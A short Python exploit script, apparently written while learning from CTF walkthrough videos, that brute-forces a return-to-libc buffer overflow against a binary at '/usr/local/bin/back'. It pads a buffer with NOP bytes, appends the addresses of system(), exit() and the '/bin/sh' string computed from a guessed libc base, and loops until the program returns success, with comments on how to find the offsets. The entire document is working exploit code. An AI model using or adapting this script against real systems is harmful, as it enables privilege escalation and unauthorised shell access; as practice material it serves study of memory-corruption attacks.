# Learnt and modifed from ippsec videos
# used to brute-forcely try to ret2libc

from subprocess import call
import struct
import sys

def pack(addr):
    return struct.pack('<I', addr)

libc_base = 0xf753f000      # libc base address in one observation by `ldd ./backup`
system_offset = 0x0003a940
exit_offset = 0x0002e7b0        # find by readelf -s xxxlibc.so.x | grep xxx
arg_offset = 0x0015900b         # find by strings -a -t x <path to libc.so.6> | grep '/bin/sh'

while True:
    buff = '\x90' * 512 
    buff += pack(libc_base + system_offset) 
    buff += pack(libc_base + exit_offset) 
    buff += pack(libc_base + arg_offset)
    ret = call(['/usr/local/bin/back', 'zhe0ops', '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474', buff])
    if ret == 0:
        break
